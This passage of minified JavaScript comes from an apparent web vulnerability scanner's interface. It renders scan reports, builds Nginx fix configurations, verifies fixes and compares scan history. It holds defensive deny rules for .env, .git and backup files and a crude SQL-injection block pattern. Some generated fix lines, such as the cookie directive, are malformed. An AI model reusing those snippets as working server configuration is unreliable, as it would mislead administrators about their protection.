style="font-size:12px;line-height:2;max-height:200px;overflow-y:auto">',e.crawled_pages.forEach(function(l){n+='<div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--border-light)">',n+='<span style="color:'+(l.status===200?"var(--success)":"var(--warning)")+';font-weight:600;min-width:30px">['+l.status+"]</span>",n+='<span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+S(l.url)+'">'+S(l.url)+"</span>",l.forms>0&&(n+='<span style="color:var(--warning);font-size:12px">'+l.forms+" 表单</span>"),l.inputs>0&&(n+='<span style="color:var(--primary);font-size:12px">'+l.inputs+" 输入框</span>"),n+="</div>"}),n+="</div></div>"),e.vuln_tests&&e.vuln_tests.length>0){let l=e.vuln_tests.filter(function(J){return J.vulnerable}).length,A=e.vuln_tests.length;n+='<div class="card fade-in-up" style="animation-delay:0.40s">',n+='<div class="card-title"> 参数与表单验证</div>',n+='<div style="display:flex;gap:12px;margin-bottom:10px;font-size:13px">',n+='<span style="color:var(--text-secondary)">检测项总数: <strong>'+A+"</strong></span>",n+='<span style="color:'+(l>0?"var(--danger)":"var(--success)")+'">发现漏洞: <strong>'+l+"</strong></span>",n+="</div>",n+='<div style="font-size:12px;line-height:1.8;max-height:180px;overflow-y:auto">',e.vuln_tests.forEach(function(J){let N=J.vulnerable?"var(--danger)":"var(--text-lighter)",U=(J.vulnerable,"");n+='<div style="color:'+N+';padding:2px 0">',n+=U+" ["+J.type+"] "+S(J.param)+"="+S(J.payload)+" ("+S(J.url.substring(0,50))+"...)</div>"}),n+="</div></div>"}e.scan_type==="deep"&&(n+='<div style="text-align:center;margin:12px 0">',n+='<span style="display:inline-block;padding:4px 14px;background:rgba(75,110,175,0.1);color:var(--primary);border-radius:2px;font-size:12px;font-weight:600">深度扫描模式 - 含参数与表单验证</span>',n+="</div>");let z=e.findings.filter(function(l){return l.owasp==="A05 安全配置错误"||l.owasp==="A02 加密机制失效"||l.name.indexOf("缺少")===0});z.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.42s">',n+='<div class="card-title"> 一键生成修复配置</div>',n+='<p style="font-size:13px;color:var(--text-secondary);margin-bottom:10px">检测到 '+z.length+" 个配置类问题，可自动生成 Nginx 修复配置。</p>",n+='<div class="fixer-btns">',n+='<button class="fixer-btn primary" onclick="goToFixerWithScanResult()"> 生成修复配置</button>',n+='<div class="report-download-dropdown">',n+='<button class="pdf-download-btn" onclick="toggleReportDropdown()"> 下载报告 <span style="font-size:11px">▼</span></button>',n+='<div class="report-dropdown-menu" id="report-dropdown">',n+=`<div onclick="downloadReport('pdf');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background='var(--bg-secondary)'" onmouseout="this.style.background='transparent'">`,n+='<span>PDF</span><span>PDF 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">适合打印存档</span>',n+="</div>",n+=`<div onclick="downloadReport('html');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background='var(--bg-secondary)'" onmouseout="this.style.background='transparent'">`,n+='<span>HTML</span><span>HTML 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">精美可交互</span>',n+="</div>",n+="</div></div>",n+='<button class="fixer-btn success" id="verify-fix-btn" onclick="verifyFix()"> 验证修复效果</button>',n+="</div>",n+="</div>"),n+='<div class="card fade-in-up" style="animation-delay:0.7s;background:#3c3f41,rgba(115,201,144,0.02));border:1px solid rgba(115,201,144,0.2);text-align:center">',n+='<h3 class="card-title" style="color:var(--success)"> 扫描完成</h3>',n+='<p style="color:var(--text-secondary);margin-bottom:16px">将修复配置应用到服务器后，点击下方按钮重新扫描验证效果</p>',n+='<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">',n+='<button class="btn btn-primary" onclick="verifyFix()"> 验证修复效果</button>',n+='<button class="btn btn-secondary" onclick="shareResult()"> 分享报告</button>',n+=`<button class="btn btn-secondary" onclick="downloadReport('pdf')"> 下载 PDF</button>`,n+="</div>",n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">',n+='<div class="card-title"> PDF 报告内容说明</div>',n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">',n+="<div> <strong>风险摘要</strong>：确认漏洞数 / 疑似风险数 / 配置缺失数总览</div>",n+="<div> <strong>证据详情</strong>：每个 finding 的响应头值、敏感路径内容片段、WAF 检测依据</div>",n+="<div> <strong>建议</strong>：按服务器类型（Nginx、Apache、Express、Flask、Spring Boot、Cloudflare）分类的修复配置，含优先级排序</div>",n+="<div> <strong>复测结果</strong>：上次 vs 本次分数对比、新增问题、已修复问题列表</div>",n+="<div> <strong>评分变化</strong>：如有历史记录，展示分数变化趋势</div>",n+="</div>",n+='<div style="margin-top:10px;text-align:center">',n+=`<button class="btn btn-primary" onclick="downloadReport('pdf')"> 下载 PDF 报告</button>`,n+="</div>",n+="</div>";let P=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.exposed}).length:0,R=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.suspect}).length:0,j=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.info}).length:0,M=e.findings?e.findings.filter(function(l){return l.name.indexOf("缺少")===0}).length:0,D=e.findings?e.findings.filter(function(l){return l.type==="config"&&l.name.indexOf("缺少")!==0}).length:0,Y=[];if(P>0?Y.push("发现 "+P+" 个确认级敏感文件泄露"):Y.push("未发现确认级敏感文件泄露"),R>0&&Y.push("检测到 "+R+" 个疑似 WAF/登录页响应"),M>0||D>0){let l=M+D;Y.push("另有 "+l+" 项安全响应头/配置缺失")}let E=Y.join("，")+"。";n+='<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">',n+='<div class="card-title"> 扫描总评</div>',n+='<div style="font-size:14px;line-height:1.8;font-weight:500">'+S(E)+"</div>",n+='<div style="margin-top:10px;font-size:12px;line-height:2">',P>0&&(n+='<div style="color:var(--danger)"> 确认漏洞：'+P+" 个敏感文件可直接访问，需立即修复</div>"),R>0&&(n+='<div style="color:var(--warning)">疑似风险：'+R+" 个路径返回 200，但内容命中 WAF/登录页/反爬特征，因此不判定为真实泄露，建议复核</div>"),j>0&&(n+='<div style="color:var(--primary)">信息： 公开信息：'+j+" 个路径为公开协议文件（如 robots.txt），仅作为信息项展示</div>"),M>0&&(n+='<div style="color:var(--text-secondary)">&#x2022; 配置缺失：'+M+" 个安全响应头未配置</div>"),n+="</div>",e.restricted?(n+='<div style="margin-top:10px;padding:8px 12px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;line-height:1.6">',n+="<strong>受限扫描提示</strong><br/>",n+="目标存在 WAF / CDN / 登录 / 反爬限制，可能影响结果完整性。建议优先扫主域名，必要时先完成验证。",n+="</div>"):P===0&&R===0&&(M>0||D>0)&&(n+='<div style="margin-top:10px;padding:8px 12px;background:rgba(115,201,144,0.08);border-radius:2px;color:var(--success);font-size:12px">',n+=" 未发现敏感文件泄露，整体风险可控。建议优先补充缺失的安全响应头以提升评分。",n+="</div>"),n+="</div>",(function(){let l="",A="",J=!1,N="",U="",q=!1,te="",B="",I=!1,ee=e.findings.some(function(ne){return ne.type==="exposed"||ne.name&&ne.name.indexOf("敏感路径")>=0}),K=e.findings.some(function(ne){return ne.severity==="high"&&ne.name&&(ne.name.indexOf("HSTS")>=0||ne.name.indexOf("CSP")>=0)}),X=e.findings.some(function(ne){return(ne.severity==="medium"||ne.severity==="low")&&ne.type==="config"}),ge=e.findings.some(function(ne){return ne.name&&ne.name.indexOf("Server")>=0}),re=e.findings.filter(function(ne){return ne.severity==="high"&&ne.name&&ne.name.indexOf("缺少")===0}),ae=e.findings.filter(function(ne){return(ne.severity==="medium"||ne.severity==="low")&&ne.name&&ne.name.indexOf("缺少")===0});if(ee?(l="修复 exposed 敏感路径（限制 .env/.git 等文件访问）",A="预计提升 20 分",J=!1):K?(l="修复 high severity 响应头缺失（CSP / HSTS）",A="预计提升 15 分",J=!1):(l="无紧急暴露路径，响应头配置良好",A="保持当前状态",J=!0),X||ge||ae.length>0){let ne=[];ae.length>0&&ne.push("补充 "+ae.length+" 个 medium/low 响应头"),ge&&ne.push("隐藏 Server 版本信息"),N=ne.join(" + ")||"检查并优化配置项",U="预计提升 8 分",q=!1}else N="medium/low 配置已完善，Server 信息已隐藏",U="无需操作",q=!0;te="生成修复配置后重新扫描，确认分数提升",B="验证闭环",I=J&&q;let oe=function(ne){return ne?'<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 已完成</span>':'<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 未开始</span>'};n+='<div class="card fade-in-up" style="animation-delay:0.75s;background:#3c3f41,rgba(16,185,129,0.04));border:1px solid rgba(115,201,144,0.2)">',n+='<div class="card-title"> 修复优先级路线</div>',n+='<div style="display:flex;flex-direction:column;gap:10px">',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">1. 第一步（立即）</strong>',n+=oe(J),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+l+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+A+"</div>",n+="</div>",n+='<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">2. 第二步（今天）</strong>',n+=oe(q),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+N+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+U+"</div>",n+="</div>",n+='<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">3. 第三步（复测）</strong>',n+=oe(I),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+te+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+B+"</div>",n+="</div>",n+="</div></div>"})(),n+='<div style="margin-top:20px;padding:16px;background:var(--bg-secondary);border-radius:2px;font-size:12px;color:var(--text-secondary)">',n+='<div style="font-weight:600;margin-bottom:8px">交付说明</div>',n+="<div>本次交付覆盖：HTTPS/TLS 配置、安全响应头（HSTS/CSP/X-Frame-Options 等 15+ 项）、Cookie 安全属性、CORS 策略、敏感路径暴露、登录态与重定向风险、弱口令与限流策略、XSS / SQL 注入 / SSRF 线索识别、WAF 识别。</div>",n+='<div style="margin-top:4px">不进行：破坏性攻击、主动利用、授权外目标测试和深度渗透动作。</div>',n+='<div style="margin-top:4px;color:var(--text-light)">如需更全面的安全评估，可在当前报告基础上追加专项复测或人工审计。</div>',n+='<div style="margin-top:8px;font-weight:600">如何验收</div>',n+="<div>每个发现项都附有请求、响应、命中签名和摘要信息。建议先看证据，再结合二次扫描结果和原始响应确认；复测后重新扫描，对比评分和证据变化即可验证效果。</div>",n+='<div style="margin-top:8px;font-weight:600">证据分层</div>',n+="<div>“已验证”表示证据充分；“建议复核”表示线索较强但仍建议人工确认；“待人工复核”表示命中线索较弱，需人工再看一眼。</div>",n+='<div style="margin-top:8px;font-weight:600">适用范围</div>',n+="<div>本报告覆盖 HTTP/TLS 配置、安全响应头、Cookie 标记、CORS、敏感路径、登录态/重定向线索、基础注入线索和 WAF 识别，不包含破坏性利用或深度渗透动作。</div>",n+='<div style="margin-top:8px;font-weight:600">交付声明</div>',n+="<div>本报告由 Vuln Sentinel 自动生成，仅反映扫描时刻的目标配置状况，可用于客户交付、项目验收和修复跟踪，不构成完整安全审计结论。</div>",n+="</div>";let H=document.getElementById("result-content");if(!H){setTimeout(function(){_t(e)},0);return}H.innerHTML=n,gn(e),hn(e.score)}catch(i){console.error("renderResult error:",i);let t=document.getElementById("result-content");t&&(t.innerHTML='<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">!</div><h3 style="color:var(--danger);margin-bottom:8px">报告渲染出错</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在渲染扫描报告时遇到问题，但扫描数据本身是完整的。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：'+S(i.message||String(i))+'</p><button class="btn btn-primary" onclick="location.reload()"> 刷新页面重试</button></div>')}}function Ns(){if(!de||!de.redirect_reason){L("无法识别跳转目标地址");return}let i=de.redirect_reason.match(/https?:\/\/[^\s\)]+/);if(i&&i[0]){let t=i[0],s=document.getElementById("scan-url");s&&(s.value=t),xi()}else L("无法识别跳转目标地址")}function $s(){if(!de||!de.scan_id){L("当前结果暂不支持分享");return}ce("/api/history?limit=1").then(function(e){return e.json()}).then(function(e){let i=(e.history||[])[0];if(!i||!i.share_id){L("分享链接生成失败");return}let t=window.location.origin+"/api/share/"+i.share_id;navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(t).then(function(){L("分享链接已复制到剪贴板")}):prompt("复制以下分享链接：",t)})}function Us(){let e='<div class="card fade-in-up" style="background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2);text-align:center">';e+='<div style="font-size:18px;margin-bottom:8px"></div>',e+='<div style="font-size:15px;font-weight:700;margin-bottom:6px">客户交付报告已生成</div>',e+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.7;margin-bottom:12px">',e+="报告包含以下内容：<br>",e+=" 风险摘要（已验证、建议复核、待人工复核）<br>",e+=" 证据清单（响应头值、敏感路径片段、置信度、WAF 检测依据）<br>",e+=" 修复建议（按业务优先级分类，含处置顺序）<br>",e+=" 复测结果（上次与本次分数对比、新增与已修复问题）<br>",e+=" 评分变化趋势（如有历史记录）",e+="</div>",e+=`<button class="btn btn-primary" onclick="downloadReport('pdf')"> 立即下载 PDF</button>`,e+="</div>";let i=document.getElementById("result-content");i&&i.insertAdjacentHTML("afterbegin",e)}function qs(e){Tn(e)}function Tn(e){document.querySelectorAll(".result-list-item").forEach(function(s){s.classList.remove("active")});let i=document.getElementById("finding-list-"+e);i&&i.classList.add("active"),document.querySelectorAll(".finding-detail").forEach(function(s){s.classList.remove("active")});let t=document.getElementById("finding-detail-"+e);t&&t.classList.add("active")}function Ws(){ue("gen-fix-btn",!0);try{if(!de){ue("gen-fix-btn",!1);return}let e=document.getElementById("gen-fix-input"),i=document.getElementById("gen-fix-output");if(!e||!i){ue("gen-fix-btn",!1);return}let t=e.value.trim();if(!t){i.innerHTML='<div style="color:var(--warning);font-size:13px;margin-top:8px">请输入服务器配置内容</div>',ue("gen-fix-btn",!1);return}let s=Zs(de.findings,t);i.innerHTML='<div style="margin-top:14px"><div class="finding-section"><h4>复测后配置</h4><div class="code-block">'+S(s.fixed)+`</div></div><div class="fixer-btns" style="margin-top:10px"><button class="fixer-btn success" onclick="copyText(this, '`+btoa(encodeURIComponent(s.fixed))+`')"> 复制配置</button></div></div>`}catch(e){console.error("generateFixFromResult error:",e);let i=document.getElementById("gen-fix-output");i&&(i.innerHTML='<div style="color:var(--danger);font-size:13px;margin-top:8px">错误： 生成失败：'+S(e.message||String(e))+"</div>")}finally{ue("gen-fix-btn",!1)}}function Zs(e,i){try{Array.isArray(e)||(e=[]),typeof i!="string"&&(i="");let t=i,s=/server\s*\{/.test(t);s||(t=`server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.html;

`);let r=[],o=[];if(e.forEach(function(a){let n=a.name||"",d=a.type||"config",f=String(d||"").toLowerCase(),v=a.fix||"";n.indexOf("缺少 ")===0&&(n.indexOf("HSTS")>=0||n.indexOf("CSP")>=0||n.indexOf("X-Frame")>=0||n.indexOf("X-Content")>=0||n.indexOf("Referrer")>=0||n.indexOf("Permissions")>=0)?v&&r.push(v):n.indexOf("敏感路径")>=0||n.indexOf("敏感文件")>=0?o.push(`location ~ /(.env|.git|.*.sql|.*.zip|.*.bak) {
    deny all;
    return 403;
}`):n.indexOf("信息泄露")>=0||n.indexOf("Server")>=0?r.push("server_tokens off;"):n.indexOf("Cookie")>=0?r.push("proxy_cookie_path / /; HttpOnly; Secure; SameSite=Strict;"):n.indexOf("CORS")>=0?r.push("add_header Access-Control-Allow-Origin 'https://your-domain.com' always;"):(f==="xss"||n.toLowerCase().indexOf("xss")>=0)&&v?r.push(`add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;`):(f==="csrf"||n.toLowerCase().indexOf("csrf")>=0||n.toLowerCase().indexOf("xsrf")>=0)&&v?o.push("# CSRF: enforce token validation, SameSite cookies, and Origin/Referer checks."):(f==="traversal"||n.toLowerCase().indexOf("path traversal")>=0||n.indexOf("目录穿越")>=0)&&v?o.push("# Traversal: normalize paths and restrict access to an allowed base directory."):(f==="ssrf"||n.toLowerCase().indexOf("ssrf")>=0)&&v?o.push("# SSRF: validate targets, block private IP ranges, and resolve DNS before fetching."):(f==="auth_weakness"||n.indexOf("认证")>=0||n.indexOf("登录")>=0)&&v?o.push("# Authentication: add CSRF tokens, secure cookies, X-Frame-Options, and centralized auth middleware."):(f==="bruteforce_protection"||n.indexOf("防爆破")>=0||n.indexOf("限流")>=0)&&v?o.push("# Brute force protection: add login throttling, account lockout, CAPTCHA/2FA, and audit logging."):(f==="unauthorized_access"||n.indexOf("未授权")>=0||n.indexOf("越权")>=0)&&v?o.push("# Unauthorized access: protect sensitive routes with authentication and object-level authorization."):(f==="api_auth_missing"||n.indexOf("API 鉴权")>=0)&&v?o.push("# API authorization: require authentication and object-level authorization for every sensitive endpoint."):(f==="sensitive_config_exposure"||n.indexOf("敏感配置")>=0)&&v?o.push("# Sensitive config: deny access to .env/.git/backups and remove secrets from public artifacts."):(f==="clickjacking"||n.indexOf("点击劫持")>=0||n.indexOf("X-Frame-Options")>=0)&&v?o.push("# Clickjacking: set X-Frame-Options or frame-ancestors to block unauthorized embedding."):(f==="file_upload"||n.indexOf("文件上传")>=0||n.indexOf("上传")>=0)&&v?o.push("# File upload: restrict extensions, verify MIME type, scan content, and store uploads outside web root."):(f==="logic_bypass"||n.indexOf("逻辑绕过")>=0||n.indexOf("业务绕过")>=0)&&v?o.push("# Logic bypass: enforce server-side state checks, step order, and authorization at every transition."):(f==="cmdi"||n.toLowerCase().indexOf("command injection")>=0||n.indexOf("命令注入")>=0)&&v?o.push("# Command injection: avoid shell=True, use argument arrays, and whitelist every executable argument."):(f==="xxe"||n.toLowerCase().indexOf("xxe")>=0||n.indexOf("xml external entity")>=0)&&v?o.push("# XXE: disable DTD and external entities, and use safe XML parser settings."):(f==="idor"||n.toLowerCase().indexOf("idor")>=0||n.indexOf("对象级")>=0)&&v?o.push("# IDOR: enforce object-level authorization on every record lookup."):(f==="deserialization"||n.toLowerCase().indexOf("deserialization")>=0||n.indexOf("反序列化")>=0)&&v?o.push("# Deserialization: forbid untrusted object graphs, add allowlists, and sign payloads before loading."):(f==="ssti"||n.indexOf("模板注入")>=0)&&v?o.push("# Template engine: enable auto-escaping and never concatenate user input into expressions."):(f==="open_redirect"||n.indexOf("开放重定向")>=0)&&v?o.push("# Redirects: validate targets against a whitelist and allow only trusted relative paths."):f==="sqli"&&v&&o.push('# ModSecurity: SecRule ARGS "(OR|UNION)" "deny,status:403"')}),r.length>0||o.length>0)if(s){let a=t.lastIndexOf("}"),n=t.substring(0,a),d=t.substring(a);r.length>0&&(n+=`
    # === 安全响应头（由漏洞哨兵生成） ===
`,r.forEach(function(f){f.split(`
`).forEach(function(c){c.trim()&&(n+="    "+c.trim()+`
`)})})),o.length>0&&(n+=`
    # === 拦截规则（由漏洞哨兵生成） ===
`,o.forEach(function(f){n+="    "+f+`
`})),t=n+d}else r.forEach(function(a){t+=a+`
`}),o.forEach(function(a){t+=a+`
`}),t+=`}
`;return{fixed:t}}catch(t){return console.error("generateFixFromFindings error:",t),{fixed:i||"",error:t.message||String(t)}}}function Xs(){if(!de){L("请先完成扫描");return}ue("goto-fixer-btn",!0),Ee("fixer"),L("正在生成修复方案...");let e=de.url;ce("/api/fix",{method:"POST",body:JSON.stringify({url:e})}).then(function(i){return i.json()}).then(function(i){if(ue("goto-fixer-btn",!1),i.success)qe=i.fixes,pi(i.fixes,i.score);else{let t=document.getElementById("fixer-result");t&&(t.innerHTML='<div class="card"><p style="color:var(--danger)">生成失败: '+S(Ue(i))+"</p></div>")}}).catch(function(i){ue("goto-fixer-btn",!1);let t=In(de.findings);qe=t,pi(t,de.score)})}function In(e){try{Array.isArray(e)||(e=[]);let i={nginx:[],apache:[],express:[],flask:[],spring_boot:[],cloudflare:[],python:[],nodejs:[]};return e.forEach(function(t){let s=t.fix||"";s&&(i.nginx.push(s),i.apache.push(s.replace("add_header","Header set").replace("always;","")),i.express.push("// "+t.name+": "+s.substring(0,60)),i.flask.push("# "+t.name+": "+s.substring(0,60)),i.spring_boot.push("// "+t.name+": "+s.substring(0,60)),i.cloudflare.push("# "+t.name+": "+s.substring(0,60)),i.python.push("# "+t.name+": "+s.substring(0,60)),i.nodejs.push("// "+t.name+": "+s.substring(0,60)))}),i}catch(i){return console.error("generateLocalFixes error:",i),{nginx:[],apache:[],express:[],flask:[],spring_boot:[],cloudflare:[],python:[],nodejs:[]}}}function pi(e,i){try{(!e||typeof e!="object")&&(e={nginx:[],python:[],nodejs:[],apache:[]});let t=document.getElementById("fixer-scan-prompt"),s=document.getElementById("fixer-lang-tabs"),r=document.getElementById("fixer-result");if(t&&(t.style.display="none"),s&&(s.style.display="block"),!r)return;let o="",a={nginx:"Nginx",python:"Python (Flask)",nodejs:"Node.js (Express)",apache:"Apache"},n={nginx:"",python:"",nodejs:"",apache:""},d=fn,f=e[d]||[];if(o+='<div class="card fade-in-up">',o+='<div class="card-title">'+n[d]+" "+a[d]+" 修复代码</div>",o+='<div style="font-size:12px;color:var(--text-lighter);margin-bottom:10px">共 '+f.length+" 条建议，评分: "+(typeof i=="number"&&!isNaN(i)?i:0)+"</div>",f.length===0)o+='<p style="color:var(--success);font-size:13px"> 未检测到需要修复的配置问题</p>';else{let v=f.map(function(c){return typeof c=="string"?c:c&&typeof c=="object"?c.code||"":String(c)}).join(`

`);o+='<div class="code-block" style="max-height:400px;overflow-y:auto">'+S(v)+"</div>",o+='<div class="fixer-btns" style="margin-top:12px">',o+=`<button class="fixer-btn success" onclick="copyFixCodeByLang('`+d+`')"> 复制代码</button>`,o+=`<button class="fixer-btn primary" onclick="downloadFixCode('`+d+`')"> 下载文件</button>`,o+="</div>"}o+='<div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border-light)">',o+='<div style="font-size:12px;color:var(--text-lighter);margin-bottom:8px">其他语言修复方案：</div>',["nginx","python","nodejs","apache"].forEach(function(v){if(v===d)return;let c=(e[v]||[]).length;o+='<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px">',o+="<span>"+n[v]+" "+a[v]+"</span>",o+='<span style="color:var(--text-lighter)">'+c+" 条修复</span>",o+="</div>"}),o+="</div>",o+="</div>",r.innerHTML=o}catch(t){console.error("renderFixResult error:",t);let s=document.getElementById("fixer-result");s&&(s.innerHTML='<div class="card"><p style="color:var(--danger)">渲染修复结果失败: '+S(t.message||String(t))+"</p></div>")}}function Vs(e){fn=e,document.querySelectorAll(".lang-tab").forEach(function(i){i.dataset.lang===e?i.className="fixer-btn primary lang-tab active":i.className="fixer-btn secondary lang-tab"}),qe&&pi(qe,de?de.score:0)}function Gs(e,i){i=i||"fix-",["nginx","apache","express","flask","spring_boot","cloudflare"].forEach(function(s){let r=document.getElementById(i+"tab-"+s),o=document.getElementById(i+"content-"+s);r&&o&&(s===e?(r.style.background="var(--primary)",r.style.color="#fff",r.style.borderColor="var(--primary)",o.style.display="block"):(r.style.background="transparent",r.style.color="var(--text-secondary)",r.style.borderColor="var(--border)",o.style.display="none"))})}function ki(e){return Array.isArray(e)?e.map(function(i){return typeof i=="string"?i:i&&typeof i=="object"?i.code||"":String(i)}).join(`

`):""}function Js(e){if(!qe)return;let i=ki(qe[e]||[]);wt(i),L("已复制 "+e+" 修复代码")}function Ks(e){if(!qe)return;let i=ki(qe[e]||[]),s="security-fix."+({nginx:"conf",python:"py",nodejs:"js",apache:"conf"}[e]||"txt"),r=new Blob([i],{type:"text/plain"}),o=URL.createObjectURL(r),a=document.createElement("a");a.href=o,a.download=s,document.body.appendChild(a),a.click(),document.body.removeChild(a),URL.revokeObjectURL(o),L("已下载 "+s)}async function Ys(){if(!de){L("请先完成扫描");return}let e=qe||In(de.findings),i=["nginx","apache","express","flask","spring_boot","cloudflare","python","nodejs"],t=new Vr,s={product:"Vuln Sentinel",package_type:"repair_configuration_package",target:de.url||"",generated_at:new Date().toISOString(),generated_at_local:new Date().toLocaleString("zh-CN"),scan_id:de.scan_id||null,score:typeof de.score=="number"?de.score:null,findings:Array.isArray(de.findings)?de.findings.length:0,version:"Vuln Sentinel"};t.file("manifest.json",JSON.stringify(s,null,2)),t.file("README.txt",["Vuln Sentinel 修复配置包","目标: "+(de.url||""),"生成时间: "+new Date().toLocaleString("zh-CN"),"","内容结构:","- manifest.json: 包信息与扫描摘要","- README.txt: 使用说明","- 各平台 .txt: 对应平台的修复片段","","说明:","- 如果某个平台文件为空，表示当前扫描结果暂未生成对应配置","- 请优先查看报告中的漏洞证据和修复说明"].join(`
`));let r=!1;i.forEach(function(d){let f=e&&e[d]?e[d]:[],v=f.length===0?`暂无适用配置片段
`:ki(f)+`
`;f.length>0&&(r=!0),t.file(d+".txt",v)}),r||t.file("USAGE.txt",`当前扫描结果没有直接生成平台配置片段。请先查看报告中的漏洞证据与建议，再重新生成修复包。
`);let o=await t.generateAsync({type:"blob"}),a=URL.createObjectURL(o),n=document.createElement("a");n.href=a,n.download="vuln-sentinel-fixes-"+it(de.url)+".zip",document.body.appendChild(n),n.click(),document.body.removeChild(n),URL.revokeObjectURL(a),L("修复配置包已下载")}function Qs(){if(!de){L("请先完成扫描");return}let e=de.url;if(!e){L("无法获取扫描 URL");return}let i=document.getElementById("verify-fix-btn");i&&(i.disabled=!0,i.textContent="验证中..."),L("正在重新扫描验证修复效果..."),ce("/api/verify-fix",{method:"POST",body:JSON.stringify({url:e})}).then(function(t){if(t.status===402)return t.json().then(function(s){return s._status=402,s});if(!t.ok)throw new Error("接口返回 "+t.status);return t.json()}).then(function(t){if(i&&(i.disabled=!1,i.textContent="验证修复效果"),Jt(t)){L($t(t),"error"),Fe();return}if(t.success){let s=de.score,r=t.new_score,o="重新扫描完成！评分: "+s+" → "+r;r>s?o+=" (提升 "+(r-s)+" 分)":r<s?o+=" (下降 "+(s-r)+" 分)":o+=" (无变化)",L(o);let a=(de.findings||[]).map(function(v){return v.name}),n=(t.new_findings||[]).map(function(v){return v.name}),d=a.filter(function(v){return n.indexOf(v)===-1}).length;d>0&&L("已修复 "+d+" 个安全问题");let f=Object.assign({},de,{score:t.new_score,risk_level:t.new_risk_level,findings:t.new_findings});de=f,_t(f),Ee("result"),Fe()}else L("验证失败: "+Ue(t),"error")}).catch(function(t){i&&(i.disabled=!1,i.textContent="验证修复效果"),L("验证扫描出错: "+t.message,"error")})}function An(e){_i()}function eo(){confirm("确定要清空所有扫描历史吗？此操作不可恢复。")&&ce("/api/history",{method:"DELETE"}).then(function(e){return e.json()}).then(function(e){L("已清空 "+(e.deleted||0)+" 条扫描历史"),_i(),St()}).catch(function(){L("清空失败，请检查网络","error")})}function to(){dt=!dt,Be=[];let e=document.getElementById("history-compare-bar");e&&(e.style.display=dt?"flex":"none"),Bn(),St(Kt)}function io(){dt=!1,Be=[];let e=document.getElementById("history-compare-bar");e&&(e.style.display="none"),St(Kt)}function no(e){let i=Be.indexOf(e);if(i>=0)Be.splice(i,1);else{if(Be.length>=2){L("最多选择 2 条记录进行对比");return}Be.push(e)}Bn(),St(Kt)}function Bn(){let e=document.getElementById("history-compare-count"),i=document.getElementById("history-compare-btn");e&&(e.textContent=String(Be.length)),i&&(i.disabled=Be.length!==2)}function ro(){if(Be.length!==2){L("请选择 2 条记录");return}ce("/api/history?limit=50").then(function(e){return e.json()}).then(function(e){let i=e.history||[],t=i[Be[0]],s=i[Be[1]];if(!t||!s){L("记录不存在");return}let r=so(t,s),o='<div class="card" style="margin-bottom:16px">';o+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">',o+='<div class="card-title"> 历史对比</div>',o+='<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="cancelHistoryCompare()">关闭</button>',o+="</div>",o+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px">',o+='<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">',o+='<div style="font-size:12px;color:var(--text-secondary)">'+S(t.created_at||t.time||"")+"</div>",o+='<div 